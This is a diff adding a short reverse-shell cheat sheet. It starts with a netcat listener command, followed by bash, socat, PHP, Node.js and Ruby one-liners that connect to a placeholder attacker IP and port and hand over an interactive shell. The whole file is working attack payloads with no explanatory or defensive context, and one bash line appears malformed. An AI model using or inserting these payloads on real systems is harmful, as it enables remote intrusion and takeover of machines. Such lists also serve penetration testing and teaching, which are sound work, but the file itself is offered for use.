@@ -1,0 +1,26 @@
+STEP 1: setup netcat listener
+nc -nvlp PORT_NUMBER
+
+### BASH ###
+exec /bin/bash 0&0 2>&0
+
+0<&196;exec 196<>/dev/tcp/ATTACKING_IP/PORT_NUMBER; sh <&196 >&196 2>&196
+
+exec 5<>/dev/tcp/ATTACKING_IP/PORT_NUMBER
+cat <&5 | while read line; do $line 2>&5 >&5; done  
+# or:
+while read line 0<&5; do $line 2>&5 >&5; done
+
+bash -i >& /dev/tcp/ATTACKING_IP/PORT_NUMBER 0>&1
+
+### socat ###
+socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
+
+### PHP ###
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING_IP/PORT_NUMBER 0>&1'");?>
+
+### Node.js ###
+require('child_process').exec('bash -i >& /dev/tcp/ATTACKING_IP/PORT_NUMBER 0>&1');
+
+### Ruby ###
+ruby -rsocket -e'f=TCPSocket.open(ATTACKING_IP, PORT_NUMBER).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
